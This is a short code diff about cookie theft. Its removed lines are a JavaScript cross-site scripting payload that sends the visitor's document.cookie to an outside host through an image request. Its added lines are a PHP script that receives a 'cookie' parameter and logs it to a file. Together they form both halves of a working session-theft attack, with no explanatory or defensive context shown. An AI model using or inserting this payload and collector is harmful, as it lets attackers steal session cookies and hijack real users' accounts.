@@ -1,6 +1,4 @@
-<script type="text/javascript">
-  var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie ;
-  var imgTag = document.createElement("img") ;
-  imgTag.setAttribute("src",addr) ;
-  document.body.appendChild(imgTag) ;
-</script>
+<?php
+ $cookie_id = isset($_GET['cookie']) ? sprintf("Cookie ID received : %s\n",$_GET['cookie']) : "No cookie in GET parameter\n" ;
+ $handle = fopen('trace.log', 'a+') ;
+ fputs($handle, $cookie_id, 1024) ; ?>
